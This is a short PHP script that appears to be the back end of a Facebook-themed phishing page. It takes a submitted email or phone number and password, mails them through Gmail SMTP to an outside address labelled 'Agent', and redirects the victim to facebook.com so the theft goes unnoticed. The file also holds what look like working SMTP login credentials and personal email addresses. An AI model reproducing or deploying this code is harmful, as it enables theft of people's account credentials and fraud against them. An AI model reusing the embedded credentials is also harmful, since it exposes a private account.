<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

//require_once '..PHPMailer/PHPMailerAutoload.php';
require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';


use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
if(isset($_POST["send"])) {
    $mail = new PHPMailer(true);

    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'aliceoliviau@gmail.com';
    $mail->Password ='cxriyiruvpzgwygt';
    $mail->SMTPSecure = 'ssl';
    $mail->Port = 465;

    // Set the sender and recipient information
    $mail->setFrom('aliceoliviau@gmail.com', 'Admin');

    $mail->addAddress('Peterlarry609@gmail.com', 'Agent');
    // adding additional email
    /*$mail->addAddress('zikoravalentine@gmail.com', 'ashawo');*/

    $mail->isHTML(true);

    $mail->Subject = 'Nor Reply';
    $mail->Body ='Email or number:'.PHP_EOL;//,PHP_EOL and \r\n for break in line (space)
    $mail->Body .=$_POST["email"]."<br>";
    $mail->Body .= 'Password:'."\r\n";
    $mail->Body .=$_POST["password"];

    // Send the email
  if ($mail->send()) {
    // Email sent successfully, redirect the user
    header('Location: https://www.facebook.com'); // Replace with your desired URL
    exit();
  
}
}
    /*echo
    "
    <script>
    alert('Sent Successfully');
    document.location.href = 'zypho.php'
    </script>
    ";*/
?>